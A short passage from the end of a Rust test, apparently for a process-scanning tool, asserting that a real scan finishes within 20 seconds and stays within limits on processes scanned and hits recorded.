        let out = scan(&crate::sys::RealRunner::default(), &[], false);
        assert!(t.elapsed().as_secs() < 20, "el escaneo tardó demasiado");
        assert!(out.procs_scanned <= MAX_PROCS);
        assert!(out.hits.values().all(|v| v.len() <= MAX_HITS));
    }
}
